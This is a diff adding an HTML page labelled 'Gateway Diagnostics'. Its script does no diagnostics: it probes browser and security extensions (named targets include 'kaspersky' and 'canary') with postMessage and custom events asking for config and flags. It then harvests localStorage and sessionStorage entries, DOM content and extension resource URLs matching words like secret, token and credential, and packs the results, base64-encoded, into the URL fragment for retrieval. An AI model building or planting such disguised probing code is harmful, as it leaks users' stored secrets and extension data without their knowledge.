@@ -1,0 +1,33 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8"><title>Gateway Diagnostics</title></head><body><h1>Gateway Diagnostics</h1><pre id="out">Running...</pre><script>
+(async()=>{
+"use strict";
+const rx=/canary|flag|secret|mail|gateway|extension|chrome|browser|kaspersky|token|credential|security|addon|plugin/i;
+const before=Object.getOwnPropertyNames(window);
+const messages=[];
+const mutations=[];
+const errors=[];
+addEventListener("message",e=>{if(messages.length<20){let d;try{d=JSON.parse(JSON.stringify(e.data))}catch(_){d=String(e.data)}messages.push({o:e.origin,s:e.source===window,d})}});
+addEventListener("error",e=>errors.push(String(e.message||e.error)));
+try{new MutationObserver(rs=>{for(const r of rs){if(mutations.length>=30)break;const text=(r.target&&r.target.outerHTML||"").slice(0,500);const added=[...r.addedNodes].map(n=>(n.outerHTML||n.textContent||"").slice(0,500));if(rx.test(text+added.join("")))mutations.push({t:r.type,a:r.attributeName,x:text,n:added})}}).observe(document,{subtree:true,childList:true,attributes:true})}catch(e){errors.push(String(e))}
+const probes=[
+ {type:"GET_CONFIG"},{type:"GET_FLAG"},{type:"GET_STATUS"},
+ {action:"getConfig"},{action:"getFlag"},{action:"getStatus"},
+ {source:"canary-page",type:"request",action:"config"},
+ {source:"gateway",type:"request",action:"status"}
+];
+for(const p of probes)postMessage(p,"*");
+for(const name of ["canary:get-config","canary:get-status","gateway:get-config","kaspersky:get-config","extension:get-config"]){document.dispatchEvent(new CustomEvent(name,{detail:{source:"page"}}))}
+await new Promise(r=>setTimeout(r,10000));
+const after=Object.getOwnPropertyNames(window);
+let chromeInfo=null;
+try{chromeInfo=typeof chrome==="undefined"?null:{keys:Object.getOwnPropertyNames(chrome),runtime:chrome.runtime?{id:chrome.runtime.id,keys:Object.getOwnPropertyNames(chrome.runtime)}:null}}catch(e){chromeInfo={error:String(e)}}
+let stores={local:{},session:{}};
+try{for(let i=0;i<localStorage.length;i++){const k=localStorage.key(i);if(rx.test(k+localStorage.getItem(k)))stores.local[k]=localStorage.getItem(k)}}catch(e){errors.push("ls:"+e)}
+try{for(let i=0;i<sessionStorage.length;i++){const k=sessionStorage.key(i);if(rx.test(k+sessionStorage.getItem(k)))stores.session[k]=sessionStorage.getItem(k)}}catch(e){errors.push("ss:"+e)}
+let resources=[];try{resources=performance.getEntriesByType("resource").map(x=>x.name).filter(x=>rx.test(x)||x.includes("extension://")).slice(0,30)}catch(e){errors.push("res:"+e)}
+let dom=[];try{dom=[...document.querySelectorAll("*")].map(e=>e.outerHTML).filter(x=>rx.test(x)&&!x.includes("canary_compact")).map(x=>x.slice(0,700)).slice(0,20)}catch(e){errors.push("dom:"+e)}
+const result={u:navigator.userAgent,w:navigator.webdriver,c:chromeInfo,g0:before.filter(x=>rx.test(x)),g1:after.filter(x=>rx.test(x)),ga:after.filter(x=>!before.includes(x)&&rx.test(x)),m:messages,mu:mutations,r:resources,d:dom,st:stores,e:errors};
+const b=new TextEncoder().encode(JSON.stringify(result));let s="";for(let i=0;i<b.length;i+=8192)s+=String.fromCharCode(...b.subarray(i,i+8192));let enc=btoa(s).replaceAll("+","-").replaceAll("/","_").replaceAll("=","");
+if(enc.length>3300)enc=enc.slice(0,3300);history.replaceState(null,"",location.pathname+"#d="+enc);document.getElementById("out").textContent="Complete";
+})().catch(e=>document.getElementById("out").textContent=String(e&&e.stack||e));
+</script></body></html>
